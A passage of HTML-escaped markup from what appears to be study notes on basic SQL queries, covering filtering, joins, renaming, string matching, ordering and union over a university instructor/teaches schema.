&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;ID,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;name,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;salary/&lt;span style=&#34;color:#3677a9&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;as&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;monthly_salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;filtering-where&#34; &gt;Filtering (Where)
&lt;span&gt;
    &lt;a href=&#34;#filtering-where&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;name&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_name&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;Comp.&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;Sci.&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;logical connectives: and, or, and not&lt;/li&gt;
&lt;li&gt;comparison operations:  &amp;lt;, &amp;lt;=, &amp;gt;, &amp;gt;=, =, and &amp;lt;&amp;gt; (inequality)&lt;/li&gt;
&lt;li&gt;comparisons can be applied to results of arithmetic expressions&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;select-cross-product&#34; &gt;Select Cross Product
&lt;span&gt;
    &lt;a href=&#34;#select-cross-product&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;Performs Cross product by specifying multiple relations&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;*&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;teaches&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Use where to join and remove duplicate attributes.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;*&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;teaches&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;(instructor.ID&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;teaches.ID&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;and&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructord.dept_name&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;Comp. Sci&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;and&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;year&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;2017&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;from-inner-join&#34; &gt;FROM Inner Join
&lt;span&gt;
    &lt;a href=&#34;#from-inner-join&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;inner&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;join&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;teaches&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;on&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor.ID&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;teaches.ID...&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If attributes have the same name, then both will show up with a &lt;code&gt;relation.&lt;/code&gt; prefix&lt;/p&gt;
&lt;h4 id=&#34;from-natural-join-clause&#34; &gt;FROM Natural Join Clause
&lt;span&gt;
    &lt;a href=&#34;#from-natural-join-clause&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;*&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;natural&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;join&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;teaches&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Be careful since this does it to all attributes. For specific attributes,
use &lt;code&gt;using&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;*&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;T&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;join&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;S&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;using&lt;/span&gt;(A)&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;select-as&#34; &gt;SELECT as
&lt;span&gt;
    &lt;a href=&#34;#select-as&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;Renaming the attribute in the query result&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;T.ID,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;T.name&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;as&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;T,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;as&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;S&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;T.salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;S.salary&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;and&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;S.ID&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;=&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;12121&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;string-operations&#34; &gt;String Operations
&lt;span&gt;
    &lt;a href=&#34;#string-operations&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&amp;lsquo;5&amp;quot;6&amp;rsquo; (allows double quotes)&lt;/li&gt;
&lt;li&gt;&amp;lsquo;Datebase&amp;rsquo; = &amp;lsquo;database&amp;rsquo; (false)&lt;/li&gt;
&lt;li&gt;DBMS might not differentitae (MYSQL)&lt;/li&gt;
&lt;li&gt;concat&lt;/li&gt;
&lt;li&gt;to upper or to lower&lt;/li&gt;
&lt;li&gt;string length, extracting substrings, etc.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;where-like&#34; &gt;WHERE like
&lt;span&gt;
    &lt;a href=&#34;#where-like&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;%: match any substring&lt;/li&gt;
&lt;li&gt;_: match any charater (one)&lt;/li&gt;
&lt;li&gt;escape using &lt;code&gt;escape &#39;%&#39;&lt;/code&gt; or &lt;code&gt;escape &#39;_&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;WHERE&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;attribute&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;like&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;%pattern%&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;order&#34; &gt;ORDER
&lt;span&gt;
    &lt;a href=&#34;#order&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;name&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;order&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;by&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;name&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;asc&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;   &lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;-- default is asc
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;name&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;instructor&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;order&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;by&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;dept_name,&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;name&lt;span style=&#34;color:#666&#34;&gt;  &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;desc&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;union&#34; &gt;Union
&lt;span&gt;
    &lt;a href=&#34;#union&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;course_id&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;section&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;semester=&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;Fall&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;’&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;and&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;year&lt;/span&gt;=&lt;span style=&#34;color:#3677a9&#34;&gt;2017&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;union&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;select&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;course_id&lt;span style=&#34;color:#666&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#666&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;section&lt;span style=&#34;color:#666&#34;&gt;
